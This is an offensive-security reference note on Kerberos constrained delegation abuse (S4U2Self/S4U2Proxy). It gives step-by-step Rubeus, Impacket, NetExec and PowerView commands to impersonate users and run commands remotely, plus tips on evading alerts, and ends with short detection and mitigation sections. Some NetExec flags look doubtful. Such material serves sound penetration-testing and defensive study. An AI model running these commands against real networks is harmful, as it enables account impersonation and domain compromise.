---
tags:
  - "#type/technique"
  - "#tactic/TA0008"
  - "#technique/T1558.002"
  - "#stage/lateral-movement"
  - "#os/windows"
  - "#protocol/kerberos"
  - "#tool/rubeus"
  - "#tool/impacket"
  - "#tool/powerview"
  - "#tool/netexec"
  - "#tool/delegations"
aliases:
  - Service for User to Self
  - S4U2Self
  - Kerberos Delegation Abuse
---
## Technique
___
S4U2Self (Service for User to Self) is a Kerberos extension that allows a service to request a service ticket to itself on behalf of any user without requiring that user's password. When combined with S4U2Proxy (constrained delegation), an attacker can impersonate any user to access other services, enabling powerful lateral movement capabilities.

This attack leverages Kerberos delegation, a feature designed to allow services to access resources on behalf of users. By abusing constrained delegation, attackers can impersonate high-value users (including administrators) to access target services like file shares, databases, or even domain controllers.

## Prerequisites
___

**Access Level:** Credentials (password or hash) for a service account that has constrained delegation configured.

**System State:** The compromised service account must:
- Have a registered Service Principal Name (SPN)
- Be configured with constrained delegation to specific target SPNs via the `msDS-AllowedToDelegateTo` attribute
- For protocol transition: be marked "Trusted to authenticate for delegation" (T2A4D)

**Information:** Domain name, target SPN details (e.g., `cifs/targetserver.domain.local`), and Domain Controller IP address.

## Considerations
___

**Impact**

This attack enables privilege escalation and lateral movement by allowing an attacker to impersonate any user (including domain administrators) to access specific services. It can lead to complete domain compromise if the delegation is configured to sensitive services or if misconfigured delegation permissions exist.

**OPSEC**

- **Unusual Impersonation:** S4U2Self/S4U2Proxy requests from service accounts impersonating high-value users (especially to services they don't normally access) may trigger alerts.
  
- **Volume of Requests:** Multiple delegation requests in a short timeframe can appear suspicious.
  
- **Ticket Encryption:** Modern environments typically use AES encryption. Forcing RC4 may generate alerts.
  
- **Service Account Usage:** Activity from service accounts outside normal operating hours or from unusual source machines may be flagged.

## Execution
___
### Identifying Vulnerable Accounts

#### **PowerView**

Find accounts with constrained delegation configured:

```powershell
# Import PowerView
Import-Module .\PowerView.ps1

# Find user accounts with constrained delegation
Get-DomainUser -TrustedToAuth | Select-Object samaccountname,msds-allowedtodelegateto

# Find computer accounts with constrained delegation
Get-DomainComputer -TrustedToAuth | Select-Object samaccountname,msds-allowedtodelegateto

# Find accounts with unconstrained delegation (not directly for S4U2Self but useful to know)
Get-DomainComputer -Unconstrained | Select-Object samaccountname
Get-DomainUser -Unconstrained | Select-Object samaccountname
```

### Attack Execution

- **Common Target SPNs**:
  - `cifs/server.domain.local` - File shares
  - `http/server.domain.local` - Web services
  - `ldap/dc.domain.local` - Directory services (dangerous!)
  - `mssql/sqlserver.domain.local` - SQL Server
  - `host/server.domain.local` - Various Windows services

#### **Rubeus (Windows)**

All-in-one approach (S4U2Self + S4U2Proxy):

```powershell
# 1) Create a sacrificial process to inject tickets
Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /show
# Note the process ID (PID) from the output

# 2) Perform S4U2Self + S4U2Proxy attack and inject ticket
Rubeus.exe s4u /user:SERVICE_ACCOUNT /domain:domain.local /rc4:NTLM_HASH \
    /impersonateuser:TARGET_USER /msdsspn:cifs/server.domain.local /ptt /process:PID

# 3) Verify ticket injection
Rubeus.exe triage /process:PID

# 4) Access target resource as impersonated user
dir \\server.domain.local\c$
```

Step-by-step approach (with more control):

```powershell
# 1) Request TGT for service account
Rubeus.exe asktgt /user:SERVICE_ACCOUNT /domain:domain.local /rc4:NTLM_HASH /nowrap

# 2) Perform S4U2Self to get service ticket
Rubeus.exe s4u /ticket:BASE64_TGT /impersonateuser:TARGET_USER /nowrap

# 3) Perform S4U2Proxy to get service ticket to target SPN
Rubeus.exe s4u /ticket:BASE64_TGT /tgs:BASE64_TGS \
    /msdsspn:cifs/server.domain.local /ptt
```

**Useful flags:**
- `/altservice:` - Specify alternate service to impersonate (service substitution attack)
- `/nowrap` - Prevent wrapping of base64 output
- `/ptt` - Pass the ticket into the current session
- `/dc:` - Specify domain controller for the request

#### **Impacket (Linux)**

Basic S4U2Self + S4U2Proxy attack:

```bash
# 1) Get TGT for service account
getTGT.py -dc-ip DC_IP domain.local/SERVICE_ACCOUNT:PASSWORD

# 2) Perform S4U2Self + S4U2Proxy to get service ticket
getST.py -dc-ip DC_IP -spn cifs/server.domain.local \
    -impersonate TARGET_USER domain.local/SERVICE_ACCOUNT -k

# 3) Export and use the ticket
export KRB5CCNAME=TARGET_USER.ccache
impacket-smbclient.py -k domain.local/TARGET_USER@server.domain.local
# or
impacket-smbexec.py -k domain.local/TARGET_USER@server.domain.local
```

Using NTLM hash instead of password:

```bash
# With hash instead of password
getTGT.py -dc-ip DC_IP -hashes :NTLM_HASH domain.local/SERVICE_ACCOUNT
getST.py -dc-ip DC_IP -spn cifs/server.domain.local \
    -impersonate TARGET_USER domain.local/SERVICE_ACCOUNT -k
```

#### **NetExec (Linux)**

Enumerate accounts with constrained delegation:

```bash
# Find user accounts with constrained delegation
nxc ldap DC_IP -u USER -p PASSWORD --trusted-for-delegation -d domain.local

# Find computer accounts with constrained delegation
nxc ldap DC_IP -u USER -p PASSWORD --trusted-for-delegation --computersonly -d domain.local

# Find all accounts with constrained delegation and their allowed SPNs
nxc ldap DC_IP -u USER -p PASSWORD --search "(&(objectCategory=person)(userAccountControl:1.2.840.113556.1.4.803:=16777216))" -d domain.local
```

Exploit constrained delegation to access target services:

```bash
# 1. Request TGT for service account using NetExec
nxc ldap DC_IP -u SERVICE_ACCOUNT -p PASSWORD --delegate --delegate-to cifs/server.domain.local --delegate-user TARGET_USER --kdcHost DC_IP -d domain.local

# 2. Once you have the ticket, use it with impacket tools
export KRB5CCNAME=path/to/generated.ccache
impacket-smbexec.py -k -no-pass domain.local/TARGET_USER@server.domain.local
```

Combined scan and exploit:

```bash
# Use the kdcHost parameter to specify the DC
nxc smb DC_IP -u SERVICE_ACCOUNT -p PASSWORD --delegate-access --target server.domain.local -d domain.local

# Using NTLM hash instead of password
nxc smb DC_IP -u SERVICE_ACCOUNT -H NTLM_HASH --delegate-access --target server.domain.local -d domain.local
```

#### **Delegations Tool (Linux/Windows)**

The Delegations tool provides specialized capabilities for working with S4U2Self and other delegation types.

Find accounts with constrained delegation:

```bash
# Find all constrained delegations in the domain
./Delegations find constrained --dc-ip DC_IP -d domain.local -u USER -p PASSWORD

# Find delegations with protocol transition
./Delegations find constrained --dc-ip DC_IP -d domain.local -u USER -p PASSWORD --with-protocol-transition

# Check a specific account
./Delegations find constrained --distinguished-name "CN=SERVICE_ACCOUNT,CN=Users,DC=domain,DC=local" \
    --dc-ip DC_IP -d domain.local -u USER -p PASSWORD
```

Add constrained delegation (requires admin rights):

```bash
# Add constrained delegation to a service account
./Delegations add constrained --distinguished-name "CN=SERVICE_ACCOUNT,CN=Users,DC=domain,DC=local" \
    --dc-ip DC_IP -d domain.local -u ADMIN -p PASSWORD \
    --allowed-to-delegate-to "cifs/server.domain.local"

# Add with protocol transition (enables S4U2Self without Kerberos authentication)
./Delegations add constrained --distinguished-name "CN=SERVICE_ACCOUNT,CN=Users,DC=domain,DC=local" \
    --dc-ip DC_IP -d domain.local -u ADMIN -p PASSWORD \
    --allowed-to-delegate-to "cifs/server.domain.local" --with-protocol-transition
```

Remove or modify delegations:

```bash
# Remove specific delegation permission
./Delegations remove constrained --distinguished-name "CN=SERVICE_ACCOUNT,CN=Users,DC=domain,DC=local" \
    --dc-ip DC_IP -d domain.local -u ADMIN -p PASSWORD \
    --allowed-to-delegate-to "cifs/server.domain.local"

# Clear all constrained delegations
./Delegations clear constrained --distinguished-name "CN=SERVICE_ACCOUNT,CN=Users,DC=domain,DC=local" \
    --dc-ip DC_IP -d domain.local -u ADMIN -p PASSWORD

# Add/remove protocol transition separately
./Delegations add protocoltransition --distinguished-name "CN=SERVICE_ACCOUNT,CN=Users,DC=domain,DC=local" \
    --dc-ip DC_IP -d domain.local -u ADMIN -p PASSWORD
```

### Cleanup Considerations

- Remove injected Kerberos tickets from memory when done
- Clean up any created files (ticket caches, etc.)

### Detection & Mitigation

#### Detection

- Monitor Event ID 4769 (TGS Request) for service accounts requesting tickets for privileged users
- Look for S4U2Self/S4U2Proxy usage patterns that deviate from baseline
- Check for impersonation of sensitive accounts via delegation
- Monitor for abnormal resource access by service accounts

#### Mitigation

- Mark sensitive accounts with "Account is sensitive and cannot be delegated"
- Use Resource-Based Constrained Delegation (RBCD) instead of traditional constrained delegation
- Audit and limit delegation configurations
- Implement Just-In-Time (JIT) administration
- Use Protected Users security group for privileged accounts
- Regularly audit and rotate service account credentials

## Technical Notes
___

- **S4U2Self vs S4U2Proxy**: S4U2Self gets a ticket to itself for any user; S4U2Proxy uses that ticket to request access to other configured services. Both are needed for complete delegation attacks.

- **Protocol Transition**: This allows services to accept any authentication type (not just Kerberos) and then obtain Kerberos tickets on behalf of users. Requires T2A4D flag (UserAccountControl 0x1000000).

